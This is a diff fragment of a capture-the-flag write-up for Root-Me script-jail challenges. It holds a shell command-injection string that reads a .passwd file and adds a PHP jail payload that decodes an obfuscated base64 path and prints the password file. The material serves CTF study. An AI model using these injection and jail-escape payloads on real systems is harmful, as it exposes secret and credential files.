@@ -68,3 +68,13 @@ Then enter and the flag will be prompt
 'x[$(echo `cat .passwd`))]'
 ```
 You will get an error message with the flag inside
+
+### PHP - Jail
+[PHP - Jail](https://www.root-me.org/fr/Challenges/App-Script/PHP-Jail)
+
+### Paylaod 
+```php 
+echo show_source(implode(array(base64_decode(L2NoYWxsZW5nZS9hcHAtc2NyaXB0L2NoMTMvcGFzc3dkLy5wYXNzd2Q))));
+```
+
+
